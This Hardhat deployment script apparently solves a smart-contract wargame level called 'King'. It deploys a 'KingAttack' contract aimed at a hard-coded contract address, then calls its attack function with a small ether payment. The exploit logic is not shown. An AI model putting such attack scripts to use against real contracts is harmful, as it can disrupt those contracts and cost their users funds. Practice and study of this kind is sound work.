// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

async function main() {
  // Deploy the Attack contract
  const KING_ADDRESS = "0x834e6C957d10D89F8bCAaCD591cEBb17E67F3f94"
  const KingAttack = await ethers.getContractFactory(
    "KingAttack"
  );
  const kingAttack = await KingAttack.deploy(KING_ADDRESS);
  await kingAttack.deployed();
  console.log("King Attack Proxy deployed to: ", kingAttack.address);

  // attack
  const attackTx = await kingAttack.attack({
    value: parseEther("0.0011"),
    gasLimit: 300000
  })
  attackTx.wait(2)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
